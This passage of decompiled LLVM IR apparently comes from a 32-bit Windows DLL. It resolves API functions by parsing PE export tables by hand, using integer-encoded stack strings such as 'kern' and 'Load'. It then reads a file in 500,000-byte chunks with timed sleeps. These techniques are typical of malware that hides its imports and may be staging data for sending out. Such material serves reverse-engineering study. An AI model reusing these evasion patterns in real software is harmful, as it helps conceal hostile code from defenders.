  %6 = udiv i64 %5, 4294967296, !insn.addr !6682
  %7 = trunc i64 %6 to i32, !insn.addr !6682
  %8 = sdiv i32 %7, 4, !insn.addr !6683
  %9 = lshr i32 %8, 31, !insn.addr !6684
  %10 = add nsw i32 %9, %8, !insn.addr !6685
  %11 = trunc i32 %10 to i8
  %12 = mul i8 %11, -10
  %13 = add i8 %stack_var_-8.0.reload, 48, !insn.addr !6686
  %14 = add i8 %13, %12, !insn.addr !6687
  %15 = add i32 %edi.0.reload, %0, !insn.addr !6688
  %16 = inttoptr i32 %15 to i8*, !insn.addr !6688
  store i8 %14, i8* %16, align 1, !insn.addr !6688
  %17 = add i32 %edi.0.reload, 1, !insn.addr !6689
  %18 = icmp eq i32 %10, 0, !insn.addr !6690
  %19 = icmp slt i32 %10, 0, !insn.addr !6690
  %20 = icmp eq i1 %19, false, !insn.addr !6691
  %21 = icmp eq i1 %18, false, !insn.addr !6691
  %22 = icmp eq i1 %20, %21, !insn.addr !6691
  store i8 %11, i8* %stack_var_-8.0.reg2mem, !insn.addr !6691
  store i32 %10, i32* %edx.0.reg2mem, !insn.addr !6691
  store i32 %17, i32* %edi.0.reg2mem, !insn.addr !6691
  store i32 %17, i32* %edi.1.reg2mem, !insn.addr !6691
  br i1 %22, label %dec_label_pc_1000b0e0, label %dec_label_pc_1000b112, !insn.addr !6691

dec_label_pc_1000b112:                            ; preds = %dec_label_pc_1000b0e0, %dec_label_pc_1000b0c0
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %23 = add i32 %edi.1.reload, %0
  %24 = inttoptr i32 %23 to i8*, !insn.addr !6692
  store i8 0, i8* %24, align 1, !insn.addr !6692
  %25 = ashr i32 %edi.1.reload, 31, !insn.addr !6693
  %26 = sub i32 %edi.1.reload, %25, !insn.addr !6694
  %27 = sdiv i32 %26, 2, !insn.addr !6695
  %.off = add i32 %26, 1
  %28 = icmp ult i32 %.off, 3
  %29 = icmp slt i32 %26, 0, !insn.addr !6696
  %30 = or i1 %29, %28, !insn.addr !6697
  store i32 %27, i32* %eax.0.reg2mem, !insn.addr !6697
  store i32 %23, i32* %ecx.0.in.reg2mem, !insn.addr !6697
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !6697
  store i32 %27, i32* %eax.1.reg2mem, !insn.addr !6697
  br i1 %30, label %dec_label_pc_1000b143, label %dec_label_pc_1000b130, !insn.addr !6697

dec_label_pc_1000b130:                            ; preds = %dec_label_pc_1000b112, %dec_label_pc_1000b130
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ecx.0.in.reload = load i32, i32* %ecx.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %ecx.0 = add i32 %ecx.0.in.reload, -1
  %31 = inttoptr i32 %ecx.0 to i8*, !insn.addr !6698
  %32 = load i8, i8* %31, align 1, !insn.addr !6698
  %33 = zext i8 %32 to i32, !insn.addr !6698
  %34 = and i32 %eax.0.reload, -256, !insn.addr !6698
  %35 = or i32 %34, %33, !insn.addr !6698
  %36 = add i32 %esi.0.reload, %0, !insn.addr !6699
  %37 = inttoptr i32 %36 to i8*, !insn.addr !6699
  %38 = load i8, i8* %37, align 1, !insn.addr !6699
  store i8 %32, i8* %37, align 1, !insn.addr !6700
  %39 = add nuw nsw i32 %esi.0.reload, 1, !insn.addr !6701
  store i8 %38, i8* %31, align 1, !insn.addr !6702
  %40 = icmp slt i32 %39, %27, !insn.addr !6703
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !6703
  store i32 %ecx.0, i32* %ecx.0.in.reg2mem, !insn.addr !6703
  store i32 %39, i32* %esi.0.reg2mem, !insn.addr !6703
  store i32 %35, i32* %eax.1.reg2mem, !insn.addr !6703
  br i1 %40, label %dec_label_pc_1000b130, label %dec_label_pc_1000b143, !insn.addr !6703

dec_label_pc_1000b143:                            ; preds = %dec_label_pc_1000b130, %dec_label_pc_1000b112
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !6704
}

define i32 @function_1000b150(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000b150:
  %esp.3.reg2mem = alloca i32, !insn.addr !6705
  %edx.0.reg2mem = alloca i32, !insn.addr !6705
  %esp.2.reg2mem = alloca i32, !insn.addr !6705
  %.pre-phi.reg2mem = alloca i32, !insn.addr !6705
  %esp.1.reg2mem = alloca i32, !insn.addr !6705
  %esp.0.reg2mem = alloca i32, !insn.addr !6705
  %stack_var_-11592.0.reg2mem = alloca i32, !insn.addr !6705
  %stack_var_-11580.0.reg2mem = alloca i32, !insn.addr !6705
  %ecx.0.reg2mem = alloca i32, !insn.addr !6705
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-11624 = alloca i32, align 4
  %stack_var_-1299 = alloca i32, align 4
  %stack_var_-1563 = alloca i32, align 4
  %stack_var_-932 = alloca i32, align 4
  %stack_var_-2564 = alloca i32, align 4
  %2 = call i64 @__decompiler_undefined_function_6()
  %stack_var_-11564 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-412 = alloca i8*, align 4
  %stack_var_-308 = alloca i128, align 8
  %stack_var_-828 = alloca i32, align 4
  %stack_var_-11576 = alloca i32, align 4
  %stack_var_-516 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-1036 = alloca i32, align 4
  %stack_var_-188 = alloca i8*, align 4
  %stack_var_-28 = alloca i32, align 4
  %3 = call i32 @__chkstk(), !insn.addr !6706
  %4 = inttoptr i32 %1 to i32*, !insn.addr !6707
  %5 = call i32* @_memset(i32* %4, i32 %0, i32 %arg1), !insn.addr !6707
  %6 = ptrtoint i8** %stack_var_-188 to i32, !insn.addr !6708
  %7 = bitcast i8** %stack_var_-188 to i32*, !insn.addr !6709
  %8 = call i32* @_memset(i32* nonnull %7, i32 0, i32 100), !insn.addr !6709
  %9 = ptrtoint i32* %stack_var_-1036 to i32, !insn.addr !6710
  store i32 %9, i32* %stack_var_-28, align 4, !insn.addr !6710
  %10 = call i32* @_memset(i32* nonnull %stack_var_-1036, i32 0, i32 100), !insn.addr !6711
  %11 = call i32* @GetModuleHandleA(i8* inttoptr (i32 1852990827 to i8*)), !insn.addr !6712
  %12 = ptrtoint i32* %11 to i32, !insn.addr !6712
  store i8* inttoptr (i32 1684107084 to i8*), i8** %stack_var_-188, align 4, !insn.addr !6713
  %13 = add i32 %12, 60, !insn.addr !6714
  %14 = inttoptr i32 %13 to i32*, !insn.addr !6714
  %15 = load i32, i32* %14, align 4, !insn.addr !6714
  %16 = add i32 %12, 120, !insn.addr !6715
  %17 = add i32 %16, %15, !insn.addr !6715
  %18 = inttoptr i32 %17 to i32*, !insn.addr !6715
  %19 = load i32, i32* %18, align 4, !insn.addr !6715
  %20 = add i32 %19, %12, !insn.addr !6716
  store i32 %12, i32* %stack_var_-28, align 4, !insn.addr !6717
  %21 = call i32 @function_10009e60(i32 1684107084, i32* inttoptr (i32 1919052108 to i32*)), !insn.addr !6718
  %22 = add i32 %20, 36, !insn.addr !6719
  %23 = inttoptr i32 %22 to i32*, !insn.addr !6719
  %24 = load i32, i32* %23, align 4, !insn.addr !6719
  %25 = mul i32 %21, 2, !insn.addr !6720
  %26 = add i32 %25, %12, !insn.addr !6720
  %27 = add i32 %26, %24, !insn.addr !6721
  %28 = inttoptr i32 %27 to i16*, !insn.addr !6721
  %29 = load i16, i16* %28, align 2, !insn.addr !6721
  %30 = zext i16 %29 to i32, !insn.addr !6721
  %31 = add i32 %20, 28, !insn.addr !6722
  %32 = inttoptr i32 %31 to i32*, !insn.addr !6722
  %33 = load i32, i32* %32, align 4, !insn.addr !6722
  %34 = mul i32 %30, 4, !insn.addr !6723
  %35 = add i32 %33, %12, !insn.addr !6723
  %36 = add i32 %35, %34, !insn.addr !6724
  %37 = inttoptr i32 %36 to i32*, !insn.addr !6724
  %38 = load i32, i32* %37, align 4, !insn.addr !6724
  %39 = add i32 %38, %12, !insn.addr !6725
  store i32 %39, i32* @global_var_1004094c, align 4, !insn.addr !6726
  store i8* inttoptr (i32 1633906508 to i8*), i8** %stack_var_-188, align 4, !insn.addr !6727
  %40 = add i32 %39, 60, !insn.addr !6728
  %41 = inttoptr i32 %40 to i32*, !insn.addr !6728
  %42 = load i32, i32* %41, align 4, !insn.addr !6728
  %43 = add i32 %39, 120, !insn.addr !6729
  %44 = add i32 %43, %42, !insn.addr !6729
  %45 = inttoptr i32 %44 to i32*, !insn.addr !6729
  %46 = load i32, i32* %45, align 4, !insn.addr !6729
  %47 = add i32 %46, %39, !insn.addr !6730
  store i32 %6, i32* %stack_var_-28, align 4, !insn.addr !6731
  %48 = call i32 @function_10009e60(i32 1633906508, i32* inttoptr (i32 1701987948 to i32*)), !insn.addr !6732
  %49 = add i32 %47, 36, !insn.addr !6733
  %50 = inttoptr i32 %49 to i32*, !insn.addr !6733
  %51 = load i32, i32* %50, align 4, !insn.addr !6733
  %52 = mul i32 %48, 2, !insn.addr !6734
  %53 = add i32 %52, %39, !insn.addr !6734
  %54 = add i32 %53, %51, !insn.addr !6735
  %55 = inttoptr i32 %54 to i16*, !insn.addr !6735
  %56 = load i16, i16* %55, align 2, !insn.addr !6735
  %57 = zext i16 %56 to i32, !insn.addr !6735
  %58 = add i32 %47, 28, !insn.addr !6736
  %59 = inttoptr i32 %58 to i32*, !insn.addr !6736
  %60 = load i32, i32* %59, align 4, !insn.addr !6736
  %61 = mul i32 %57, 4, !insn.addr !6737
  %62 = add i32 %60, %39, !insn.addr !6737
  %63 = add i32 %62, %61, !insn.addr !6738
  %64 = inttoptr i32 %63 to i32*, !insn.addr !6738
  %65 = load i32, i32* %64, align 4, !insn.addr !6738
  %66 = add i32 %65, %39, !insn.addr !6739
  %67 = inttoptr i32 %66 to i32*, !insn.addr !6740
  %68 = call i32* @_memset(i32* %67, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !6740
  store i8* inttoptr (i32 1852990827 to i8*), i8** %stack_var_-516, align 4, !insn.addr !6741
  %69 = ptrtoint i8** %stack_var_-516 to i32, !insn.addr !6742
  store i32 %69, i32* %stack_var_-28, align 4, !insn.addr !6742
  %70 = call i32* @GetModuleHandleA(i8* inttoptr (i32 1852990827 to i8*)), !insn.addr !6743
  store i8* inttoptr (i32 1684107084 to i8*), i8** %stack_var_-188, align 4, !insn.addr !6744
  %71 = call i32 @function_10009390(), !insn.addr !6745
  store i32 %71, i32* @global_var_1004094c, align 4, !insn.addr !6746
  store i8* inttoptr (i32 1633906508 to i8*), i8** %stack_var_-188, align 4, !insn.addr !6747
  %72 = call i32 @function_10009390(), !insn.addr !6748
  store i32 %72, i32* %stack_var_-11576, align 4, !insn.addr !6749
  %73 = inttoptr i32 %72 to i32*, !insn.addr !6750
  %74 = call i32* @_memset(i32* %73, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !6750
  %75 = call i32* @_memset(i32* nonnull %stack_var_-828, i32 0, i32 100), !insn.addr !6751
  %76 = bitcast i128* %stack_var_-308 to i32*, !insn.addr !6752
  %77 = call i32* @_memset(i32* nonnull %76, i32 0, i32 100), !insn.addr !6752
  store i8* inttoptr (i32 1852990827 to i8*), i8** %stack_var_-412, align 4, !insn.addr !6753
  %78 = call i32* @GetModuleHandleA(i8* inttoptr (i32 1852990827 to i8*)), !insn.addr !6754
  store i32 1684107084, i32* %stack_var_-828, align 4, !insn.addr !6755
  %79 = call i32 @function_10009390(), !insn.addr !6756
  store i32 %79, i32* @global_var_1004094c, align 4, !insn.addr !6757
  %80 = ptrtoint i8** %stack_var_-412 to i32, !insn.addr !6758
  store i32 %80, i32* %stack_var_-40, align 4, !insn.addr !6758
  store i128 1701602642, i128* %stack_var_-308, align 8, !insn.addr !6759
  %81 = call i32 @function_10009390(), !insn.addr !6760
  %82 = load i128, i128* @global_var_10039bb0, align 4, !insn.addr !6761
  %83 = call i128 @__asm_movaps(i128 %82), !insn.addr !6761
  call void @__asm_movups(i128 undef, i128 %83), !insn.addr !6762
  %84 = call i32 @function_10009390(), !insn.addr !6763
  store i32 1684104530, i32* %stack_var_-1036, align 4, !insn.addr !6764
  %85 = call i32 @function_10009390(), !insn.addr !6765
  %86 = inttoptr i32 %85 to i32*, !insn.addr !6766
  %87 = call i32* @_memset(i32* %86, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !6766
  %88 = call i32 @function_10009390(), !insn.addr !6767
  store i32 0, i32* %stack_var_-60, align 4, !insn.addr !6768
  store i32 -2147483648, i32* %stack_var_-80, align 4, !insn.addr !6769
  %89 = inttoptr i32 %88 to i8*, !insn.addr !6770
  %90 = call i32* @CreateFileA(i8* %89, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !6770
  %91 = icmp eq i32* %90, inttoptr (i32 -1 to i32*), !insn.addr !6771
  %92 = icmp eq i1 %91, false, !insn.addr !6772
  br i1 %92, label %dec_label_pc_1000b549, label %dec_label_pc_1000bac4, !insn.addr !6772

dec_label_pc_1000b549:                            ; preds = %dec_label_pc_1000b150
  %93 = ptrtoint i32* %arg3 to i32
  %94 = call i32 @GetFileSize(i32* %90, i32* nonnull @1), !insn.addr !6773
  %95 = call i32 @function_100074a0(i32 %94), !insn.addr !6774
  %96 = call i32 @function_10001170(i32* bitcast ([3 x i8]* @global_var_100395a8 to i32*)), !insn.addr !6775
  store i32 %arg2, i32* %ecx.0.reg2mem, !insn.addr !6776
  br label %dec_label_pc_1000b590, !insn.addr !6776

dec_label_pc_1000b590:                            ; preds = %dec_label_pc_1000b590, %dec_label_pc_1000b549
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %97 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !6777
  %98 = load i8, i8* %97, align 1, !insn.addr !6777
  %99 = add i32 %ecx.0.reload, 1, !insn.addr !6778
  %100 = icmp eq i8 %98, 0, !insn.addr !6779
  %101 = icmp eq i1 %100, false, !insn.addr !6780
  store i32 %99, i32* %ecx.0.reg2mem, !insn.addr !6780
  br i1 %101, label %dec_label_pc_1000b590, label %dec_label_pc_1000b597, !insn.addr !6780

dec_label_pc_1000b597:                            ; preds = %dec_label_pc_1000b590
  %102 = call i1 @CloseHandle(i32* %90), !insn.addr !6781
  %103 = inttoptr i32 %arg2 to i8*, !insn.addr !6782
  %104 = call i32 @lstrlenA(i8* %103), !insn.addr !6782
  %105 = call i32 @function_100077e0(), !insn.addr !6783
  %106 = inttoptr i32 %105 to i8*, !insn.addr !6784
  %107 = call i32 @lstrlenA(i8* %106), !insn.addr !6784
  %108 = udiv i32 %107, 500000, !insn.addr !6785
  %109 = call i32 @GetTickCount(), !insn.addr !6786
  %110 = and i32 %109, 65535, !insn.addr !6787
  %111 = call i32 @function_1000b0c0(), !insn.addr !6788
  %112 = call i32 @function_100074a0(i32 %110), !insn.addr !6789
  %113 = inttoptr i32 %0 to i8*, !insn.addr !6790
  %114 = call i8* @lstrcatA(i8* %89, i8* %113), !insn.addr !6791
  %115 = call i8* @lstrcatA(i8* %89, i8* inttoptr (i8 ptrtoint ([4 x i8]* @global_var_100395ac to i8) to i8*)), !insn.addr !6792
  %116 = bitcast i32* %stack_var_-40 to i8*
  store i8* %89, i8** %stack_var_-188, align 4, !insn.addr !6793
  %117 = call i8* @lstrcatA(i8* %89, i8* nonnull %116), !insn.addr !6794
  %118 = call i8* @lstrcatA(i8* %89, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_100395b0, i32 0, i32 0)), !insn.addr !6795
  store i8* %89, i8** %stack_var_-200, align 4, !insn.addr !6796
  %119 = call i32 @lstrlenA(i8* %89), !insn.addr !6797
  %120 = ptrtoint i32* %stack_var_-11576 to i32, !insn.addr !6798
  %121 = ptrtoint i32* %stack_var_-11564 to i32, !insn.addr !6799
  %122 = trunc i32 %arg1 to i8, !insn.addr !6800
  %123 = call i32 @function_1000a4e0(i32 %121, i32 %120, i8 %122, i32 %93), !insn.addr !6800
  %124 = call i128 @__asm_xorps(i128 %83, i128 %83), !insn.addr !6801
  %125 = ptrtoint i8** %stack_var_-200 to i32, !insn.addr !6802
  call void @__asm_movq.31(i64 %2, i128 %124), !insn.addr !6803
  store i8* inttoptr (i32 61 to i8*), i8** %stack_var_-200, align 4, !insn.addr !6804
  %126 = icmp ult i32 %107, 500000
  store i32 %125, i32* %esp.1.reg2mem, !insn.addr !6805
  br i1 %126, label %dec_label_pc_1000b771, label %dec_label_pc_1000b6c0.preheader, !insn.addr !6805

dec_label_pc_1000b6c0.preheader:                  ; preds = %dec_label_pc_1000b597
  %127 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %105, i32* %stack_var_-11580.0.reg2mem
  store i32 %108, i32* %stack_var_-11592.0.reg2mem
  store i32 %125, i32* %esp.0.reg2mem
  br label %dec_label_pc_1000b6c0

dec_label_pc_1000b6c0:                            ; preds = %dec_label_pc_1000b6c0.preheader, %dec_label_pc_1000b6c0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %stack_var_-11592.0.reload = load i32, i32* %stack_var_-11592.0.reg2mem
  %stack_var_-11580.0.reload = load i32, i32* %stack_var_-11580.0.reg2mem
  %128 = add i32 %esp.0.reload, -4, !insn.addr !6806
  %129 = inttoptr i32 %128 to i32*, !insn.addr !6806
  store i32 1000, i32* %129, align 4, !insn.addr !6806
  call void @Sleep(i32 %stack_var_-11580.0.reload), !insn.addr !6807
  %130 = call i32 @GetTickCount(), !insn.addr !6808
  %131 = call i32 @function_1000b0c0(), !insn.addr !6809
  %132 = add i32 %esp.0.reload, -8, !insn.addr !6810
  %133 = inttoptr i32 %132 to i32*, !insn.addr !6810
  %134 = add i32 %esp.0.reload, -12, !insn.addr !6811
  %135 = inttoptr i32 %134 to i32*, !insn.addr !6811
  store i32 %88, i32* %135, align 4, !insn.addr !6811
  %136 = call i8* @lstrcpyA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6812
  %137 = add i32 %esp.0.reload, -16, !insn.addr !6813
  %138 = inttoptr i32 %137 to i32*, !insn.addr !6813
  %139 = add i32 %esp.0.reload, -20, !insn.addr !6814
  %140 = inttoptr i32 %139 to i32*, !insn.addr !6814
  store i32 %88, i32* %140, align 4, !insn.addr !6814
  %141 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6815
  %142 = add i32 %esp.0.reload, -24, !insn.addr !6816
  %143 = inttoptr i32 %142 to i32*, !insn.addr !6816
  store i32 ptrtoint ([4 x i8]* @global_var_100395b4 to i32), i32* %143, align 4, !insn.addr !6816
  %144 = add i32 %esp.0.reload, -28, !insn.addr !6817
  %145 = inttoptr i32 %144 to i32*, !insn.addr !6817
  store i32 %88, i32* %145, align 4, !insn.addr !6817
  %146 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6818
  %147 = add i32 %esp.0.reload, -32, !insn.addr !6819
  %148 = inttoptr i32 %147 to i32*, !insn.addr !6819
  store i32 %127, i32* %148, align 4, !insn.addr !6819
  %149 = add i32 %esp.0.reload, -36, !insn.addr !6820
  %150 = inttoptr i32 %149 to i32*, !insn.addr !6820
  store i32 %88, i32* %150, align 4, !insn.addr !6820
  %151 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6821
  %152 = add i32 %esp.0.reload, -40, !insn.addr !6822
  %153 = inttoptr i32 %152 to i32*, !insn.addr !6822
  store i32 %125, i32* %153, align 4, !insn.addr !6822
  %154 = add i32 %esp.0.reload, -44, !insn.addr !6823
  %155 = inttoptr i32 %154 to i32*, !insn.addr !6823
  store i32 %88, i32* %155, align 4, !insn.addr !6823
  %156 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6824
  %157 = add i32 %esp.0.reload, -48, !insn.addr !6825
  %158 = inttoptr i32 %157 to i32*, !insn.addr !6825
  store i32 %88, i32* %158, align 4, !insn.addr !6825
  %159 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !6826
  %160 = add i32 %esp.0.reload, -52, !insn.addr !6827
  %161 = inttoptr i32 %160 to i32*, !insn.addr !6827
  store i32 500000, i32* %161, align 4, !insn.addr !6827
  %162 = add i32 %esp.0.reload, -56, !insn.addr !6828
  %163 = inttoptr i32 %162 to i32*, !insn.addr !6828
  store i32 %stack_var_-11580.0.reload, i32* %163, align 4, !insn.addr !6828
  %164 = add i32 %159, %88
  %165 = add i32 %esp.0.reload, -60, !insn.addr !6829
  %166 = inttoptr i32 %165 to i32*, !insn.addr !6829
  store i32 %164, i32* %166, align 4, !insn.addr !6829
  %167 = call i32 @_memcpy.12(), !insn.addr !6830
  %168 = add i32 %164, 500000, !insn.addr !6831
  %169 = inttoptr i32 %168 to i8*, !insn.addr !6831
  store i8 0, i8* %169, align 1, !insn.addr !6831
  store i32 %93, i32* %161, align 4, !insn.addr !6832
  store i32 %arg1, i32* %163, align 4, !insn.addr !6833
  store i32 %120, i32* %166, align 4, !insn.addr !6834
  %170 = add i32 %esp.0.reload, -64, !insn.addr !6835
  %171 = inttoptr i32 %170 to i32*, !insn.addr !6835
  store i32 %121, i32* %171, align 4, !insn.addr !6835
  %172 = call i32 @function_1000a4e0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i8 ptrtoint (i32* @1 to i8), i32 ptrtoint (i32* @1 to i32)), !insn.addr !6836
  %173 = add i32 %stack_var_-11580.0.reload, 500000, !insn.addr !6837
  %174 = add i32 %stack_var_-11592.0.reload, -1, !insn.addr !6838
  %175 = icmp eq i32 %174, 0, !insn.addr !6838
  %176 = icmp eq i1 %175, false, !insn.addr !6839
  store i32 %173, i32* %stack_var_-11580.0.reg2mem, !insn.addr !6839
  store i32 %174, i32* %stack_var_-11592.0.reg2mem, !insn.addr !6839
  store i32 %157, i32* %esp.0.reg2mem, !insn.addr !6839
  store i32 %157, i32* %esp.1.reg2mem, !insn.addr !6839
  br i1 %176, label %dec_label_pc_1000b6c0, label %dec_label_pc_1000b771, !insn.addr !6839

dec_label_pc_1000b771:                            ; preds = %dec_label_pc_1000b6c0, %dec_label_pc_1000b597
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %177 = add i32 %esp.1.reload, -4, !insn.addr !6840
  %178 = inttoptr i32 %177 to i32*, !insn.addr !6840
  store i32 %105, i32* %178, align 4, !insn.addr !6840
  %179 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !6841
  %180 = ashr i32 %179, 31, !insn.addr !6842
  %181 = zext i32 %179 to i64, !insn.addr !6843
  %182 = zext i32 %180 to i64, !insn.addr !6843
  %183 = mul i64 %182, 4294967296, !insn.addr !6843
  %184 = or i64 %183, %181, !insn.addr !6843
  %185 = srem i64 %184, 500000, !insn.addr !6843
  %186 = trunc i64 %185 to i32, !insn.addr !6843
  %187 = icmp eq i32 %186, 0, !insn.addr !6844
  br i1 %187, label %dec_label_pc_1000b771.dec_label_pc_1000b851_crit_edge, label %dec_label_pc_1000b78e, !insn.addr !6845

dec_label_pc_1000b771.dec_label_pc_1000b851_crit_edge: ; preds = %dec_label_pc_1000b771
  %.pre = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !6846
  store i32 %.pre, i32* %.pre-phi.reg2mem
  store i32 %177, i32* %esp.2.reg2mem
  br label %dec_label_pc_1000b851

dec_label_pc_1000b78e:                            ; preds = %dec_label_pc_1000b771
  %188 = call i32 @GetTickCount(), !insn.addr !6847
  %189 = call i32 @function_1000b0c0(), !insn.addr !6848
  %190 = add i32 %esp.1.reload, -8, !insn.addr !6849
  %191 = inttoptr i32 %190 to i32*, !insn.addr !6849
  %192 = add i32 %esp.1.reload, -12, !insn.addr !6850
  %193 = inttoptr i32 %192 to i32*, !insn.addr !6850
  store i32 %88, i32* %193, align 4, !insn.addr !6850
  %194 = call i8* @lstrcpyA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6851
  %195 = add i32 %esp.1.reload, -16, !insn.addr !6852
  %196 = inttoptr i32 %195 to i32*, !insn.addr !6852
  %197 = add i32 %esp.1.reload, -20, !insn.addr !6853
  %198 = inttoptr i32 %197 to i32*, !insn.addr !6853
  store i32 %88, i32* %198, align 4, !insn.addr !6853
  %199 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6854
  %200 = add i32 %esp.1.reload, -24, !insn.addr !6855
  %201 = inttoptr i32 %200 to i32*, !insn.addr !6855
  store i32 ptrtoint ([4 x i8]* @global_var_100395b4 to i32), i32* %201, align 4, !insn.addr !6855
  %202 = add i32 %esp.1.reload, -28, !insn.addr !6856
  %203 = inttoptr i32 %202 to i32*, !insn.addr !6856
  store i32 %88, i32* %203, align 4, !insn.addr !6856
  %204 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6857
  %205 = add i32 %esp.1.reload, -32, !insn.addr !6858
  %206 = inttoptr i32 %205 to i32*, !insn.addr !6858
  %207 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %207, i32* %206, align 4, !insn.addr !6858
  %208 = add i32 %esp.1.reload, -36, !insn.addr !6859
  %209 = inttoptr i32 %208 to i32*, !insn.addr !6859
  store i32 %88, i32* %209, align 4, !insn.addr !6859
  %210 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6860
  %211 = add i32 %esp.1.reload, -40, !insn.addr !6861
  %212 = inttoptr i32 %211 to i32*, !insn.addr !6861
  store i32 ptrtoint (i16* @global_var_10039464 to i32), i32* %212, align 4, !insn.addr !6861
  %213 = add i32 %esp.1.reload, -44, !insn.addr !6862
  %214 = inttoptr i32 %213 to i32*, !insn.addr !6862
  store i32 %88, i32* %214, align 4, !insn.addr !6862
  %215 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6863
  %216 = add i32 %esp.1.reload, -48, !insn.addr !6864
  %217 = inttoptr i32 %216 to i32*, !insn.addr !6864
  store i32 %88, i32* %217, align 4, !insn.addr !6864
  %218 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !6865
  %219 = add i32 %esp.1.reload, -52, !insn.addr !6866
  %220 = inttoptr i32 %219 to i32*, !insn.addr !6866
  store i32 %105, i32* %220, align 4, !insn.addr !6866
  %221 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !6867
  %222 = ashr i32 %221, 31, !insn.addr !6868
  %223 = zext i32 %221 to i64, !insn.addr !6869
  %224 = zext i32 %222 to i64, !insn.addr !6869
  %225 = mul i64 %224, 4294967296, !insn.addr !6869
  %226 = or i64 %225, %223, !insn.addr !6869
  %227 = srem i64 %226, 500000, !insn.addr !6869
  %228 = trunc i64 %227 to i32, !insn.addr !6869
  %229 = mul i32 %108, 500000, !insn.addr !6870
  %230 = add i32 %218, %88
  %231 = add i32 %esp.1.reload, -56, !insn.addr !6871
  %232 = inttoptr i32 %231 to i32*, !insn.addr !6871
  store i32 %228, i32* %232, align 4, !insn.addr !6871
  %233 = add i32 %229, %105, !insn.addr !6872
  %234 = add i32 %esp.1.reload, -60, !insn.addr !6873
  %235 = inttoptr i32 %234 to i32*, !insn.addr !6873
  store i32 %233, i32* %235, align 4, !insn.addr !6873
  %236 = add i32 %esp.1.reload, -64, !insn.addr !6874
  %237 = inttoptr i32 %236 to i32*, !insn.addr !6874
  store i32 %230, i32* %237, align 4, !insn.addr !6874
  %238 = call i32 @_memcpy.12(), !insn.addr !6875
  store i32 %105, i32* %232, align 4, !insn.addr !6876
  %239 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !6877
  %240 = ashr i32 %239, 31, !insn.addr !6878
  %241 = zext i32 %239 to i64, !insn.addr !6879
  %242 = zext i32 %240 to i64, !insn.addr !6879
  %243 = mul i64 %242, 4294967296, !insn.addr !6879
  %244 = or i64 %243, %241, !insn.addr !6879
  %245 = srem i64 %244, 500000, !insn.addr !6879
  %246 = trunc i64 %245 to i32, !insn.addr !6879
  store i32 %93, i32* %235, align 4, !insn.addr !6880
  store i32 %arg1, i32* %237, align 4, !insn.addr !6881
  %247 = add i32 %esp.1.reload, -68, !insn.addr !6882
  %248 = inttoptr i32 %247 to i32*, !insn.addr !6882
  store i32 %120, i32* %248, align 4, !insn.addr !6882
  %249 = add i32 %230, %246, !insn.addr !6883
  %250 = inttoptr i32 %249 to i8*, !insn.addr !6883
  store i8 0, i8* %250, align 1, !insn.addr !6883
  %251 = add i32 %esp.1.reload, -72, !insn.addr !6884
  %252 = inttoptr i32 %251 to i32*, !insn.addr !6884
  store i32 %121, i32* %252, align 4, !insn.addr !6884
  %253 = call i32 @function_1000a4e0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i8 ptrtoint (i32* @1 to i8), i32 ptrtoint (i32* @1 to i32)), !insn.addr !6885
